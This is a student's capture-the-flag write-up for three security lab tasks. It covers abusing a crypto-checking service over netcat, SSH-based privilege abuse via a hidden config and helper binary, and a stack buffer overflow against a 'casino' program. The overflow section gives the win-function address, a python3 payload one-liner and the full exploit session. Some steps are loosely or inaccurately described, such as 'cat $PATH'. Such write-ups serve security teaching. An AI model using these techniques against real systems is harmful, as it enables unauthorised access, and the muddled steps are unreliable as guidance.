Task1 - Result: SpeishFlag{iYk4wY7vSYFWVmcmP1gvlUFrudlH3sxE}

Firstly, I took the message from message.txt and decoded it from base64 using this website:
https://www.base64decode.org/

This resulted in:
```{"n": 14038279245896146096352238237947274508254687636255158417144897911727934487744385077705712111134624993618848955529376008832604802536168339876112122812013919594093192039411809495689491609900254868476863398795866127816171778596800854831341780809239436921127930912701471446174266656880972789223833639117113881853434689178851766113335941223396641036509929993801012448995763764175383258065045017914018231669863635002603493587843122019544234901489406896938205245558713010882665861557135545491800697560099038115186750412300416588433008758692955795905539726035511888851259755193413583776486939560319518061785352397561748891531, "e": 137993, "flag": "AQH6GT6v1bjv4geTZ55mkZ5ATpq5Nj+2aKsYW6SFqGwtb4wcCyJOGiEzgDuJgqwwpDDdF67iHbKGfN2QtsNK007USEf+o6g2wzDQ5fBZTtu4kGF3RU5BBdni9n2WHfxIEZPfgT4HTHDWe2liBegHGAJWN/NxARgKSEaRki2PwxDVosgXer36TEpx66xPxGVnC9iKmGwwu0XmmiLtxP/2nZOY4KHdunrIQ4rmOUO1GsOYi4SEoCAYRWlCXYIuTniXWVYxcRJSGV5Edoy1pBNW6TKGiwhGwUQopyk/NZ0tnPqyTnGqGXGlR3Om3ZiJv1msrBGjPER8+p8h4UFM1fkHYc0K"}```

Then, I used the netcat command ``` nc isc2023.1337.cx 11091``` and send a random encrypted
message to the server to see the behaviour.

```Please enter your secret message for verification:
aGVsbG8gd29ybGQ=
Traceback (most recent call last):
  File "/usr/local/bin/crypto-checker.py", line 45, in <module>
    message_obj = json.loads(base64.b64decode(message_enc))
  File "/usr/lib/python3.8/json/_init_.py", line 357, in loads
    return _default_decoder.decode(s)
  File "/usr/lib/python3.8/json/decoder.py", line 337, in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
  File "/usr/lib/python3.8/json/decoder.py", line 355, in raw_decode
    raise JSONDecodeError("Expecting value", s, err.value) from None
json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)```

To decrypt the message, I used the function from the output:
```base64.b64decode(message_enc) and the gmpy library to convert it to binary:
gmpy2.from_binary(base64.b64decode(message_enc))```

Then, I used the flag from the original decrypted message:
```gmpy2.from_binary(base64.b64decode("AQH6GT6v1bjv4geTZ55mkZ5ATpq5Nj+2aKsYW6SFqGwtb4wcCyJOGiEzgDuJgqwwpDDdF67iHbKGfN2QtsNK007USEf+o6g2wzDQ5fBZTtu4kGF3RU5BBdni9n2WHfxIEZPfgT4HTHDWe2liBegHGAJWN/NxARgKSEaRki2PwxDVosgXer36TEpx66xPxGVnC9iKmGwwu0XmmiLtxP/2nZOY4KHdunrIQ4rmOUO1GsOYi4SEoCAYRWlCXYIuTniXWVYxcRJSGV5Edoy1pBNW6TKGiwhGwUQopyk/NZ0tnPqyTnGqGXGlR3Om3ZiJv1msrBGjPER8+p8h4UFM1fkHYc0K"))```

```mpz(1363659222958754023523014263707659123024685870954600043395437572713881082985428616965834243954806845493618594846064919267271571256456504418195474933675729562864171238505460741994204845581335406237630191040032539262040407582035880089348516650923262838763324524556219173707464566125998489455663479212178964930395344387246963975989693285096769168620460518501020665913526269731917595422123881368689000376987423044578001659229561319018372355490896593109451421470724428332218540460400876757773490512013393189648715377171257718967995457286290929134277191659067069913087318141101642664068842757159555058665014174354304276986)```

Then, I ran the netcat command again and it printed this hexa message:
```b'\xa6\xe0\xca\xd2\xe6\xd0\x8c\xd8\xc2\xce\xf6\xd2\xb2\xd6h\xee\xb2n\xec\xa6\xb2\x8c\xae\xac\xda\xc6\xda\xa0b\xce\xec\xd8\xaa\x8c\xe4\xea\xc8\xd8\x90f\xe6\xf0\x8a\xfa'```

Then, I decrypted it from ASCII and got the flag:
```SpeishFlag{iYk4wY7vSYFWVmcmP1gvlUFrudlH3sxE}```

other links used to complete the task:
https://codebeautify.org/json-to-base64-converter
https://www.base64encode.org/



Task2 - Result: SpeishFlag{EYiiFbEBVHPaSF1IQGok9QGxYhuAZMlO}

Firstly, I found the username and host name of the machine in the public key. To connect
to the machine using the private key, I used the following command:

```ssh -i id_rsa janitor@isc2023.1337.cx```

Printed the path variable:
```cat $PATH```

And found that the scripts are in /usr/local/bin

Used ltrace command to find the path:
```ltrace robot-sudo vacuum-control
path ---- /etc/dir/ceva/r0b0t3rs.conf```

To find the flag I got the binary that the user with prviledges can access:
```strings /etc/dir/ceva/r0b0t3rs.conf```

I found the argument the script should be ran with:
```cat /etc/dir/ceva/r0b0t3rs.conf``` -- 8d69b0b3d3aec3131933ff8186641675

I ran the script I made:
Script used:
```strings /etc/dir/ceva/r0b0t3rs.conf
/etc/init.d/.haha/b0ss-call 8d69b0b3d3aec3131933ff8186641675```

Result: SpeishFlag{EYiiFbEBVHPaSF1IQGok9QGxYhuAZMlO}

Task3 - Result: SpeishFlag{7OkJB5fRdl0AJgbd1nzMlX1FMaE0C25r}

Firstly, I opened the executable file in ghidra to analyze the code.
I saw that the function win was not called in the main program => I needed to do a buffer overflow. Then, I saw that the function loop was called in the main function and went to analyze it. I checked where the there was anything read from the stdin, because it it sensitive to buffer overflow and found a scanf: ```iVar1 = __isoc99_scanf(&DAT_0804a023,local_a8 + uVar4);```
local_a8 + uVar4 + padding = 42 bytes.

I used this command to fill the payload with the name the program promts, the size of bytes for the buffer overflow described earlier and the address of return the win function in decimal and a 'x'.
addr for win: 08049236
addr for win in decimal: 134517302
link i used to transform from hexa to decimal: https://www.rapidtables.com/convert/number/hex-to-decimal.html 

Command: ```python3 -c 'print ("Andreea" + "\n" + 42 * "0 " + "134517302 " + "x")' > payload```
then run: ```cat payload | ./casino```
And the program prompted:
You shall not pass! -> which meant i sucessfully entered the win function, but it needed one more parameter.

To get the flag i run: 
1. telnet isc2023.root.sx 10058
2. Entered my name: Andreea
3. x -> to get the lucky number
4. then i put the 42 bytes of 0 + the addr of win function in decimal + a random character (0) for the ret address of win + the lucky number i got + x character
eg: 
```0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 134517302 0 35887 x```
5. Enter and the program prompted the flag.

Steps:
```andreea@andreea-VirtualBox:~/Downloads/andreea.spinochi/binary-exploit$ telnet isc2023.root.sx 10058
Trying 141.85.228.32...
Connected to isc2023.root.sx.
Escape character is '^]'.
Welcome to the Saint Tropez Virtual Casino!
Please enter your name:
Andreea
!elcome, Andreea
Your balance: $485

Please enter the list of numbers you want to roll (write 'x' to stop): 
x
You got: 0 out of 0
Remaining balance: $384
Continue? [Y/n]y

Here's your lucky number: 35887

Please enter the list of numbers you want to roll (write 'x' to stop): 
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 134517302 0 35887 x
You got: 45 out of 45
Remaining balance: $328
Continue? [Y/n]n
KThxBye!
SpeishFlag{7OkJB5fRdl0AJgbd1nzMlX1FMaE0C25r}
```





